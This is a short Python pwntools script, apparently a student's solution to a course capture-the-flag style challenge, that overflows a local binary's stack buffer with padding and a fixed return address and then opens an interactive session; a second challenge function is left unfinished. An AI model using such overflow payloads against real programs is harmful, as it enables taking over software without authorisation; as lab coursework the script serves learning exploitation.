from typing import Any
import pwn

pwn.context.clear(arch="amd64")

p = pwn.process("/home/cubscout61/Current/CS390R/Projects/project2/chall_1/chall")

pwn.gdb.attach(target=p)

main_payload = bytearray()
main_payload += b"a" * 16
main_payload += b"b" * 8
main_payload += pwn.p64(0x40127a)

print(str(p.recvline(), encoding="ascii"))
p.sendline(main_payload)
print(str(main_payload, encoding="ascii"))
print(p.recvline())
p.interactive()


def challenge_1():
    c1_payload = bytearray()
    c1_payload += b"The Mysterious Benidict Society"
    assert len(c1_payload) < 28, "help the payload is too long"
    c1_payload += b"a" * (28 - len(c1_payload))
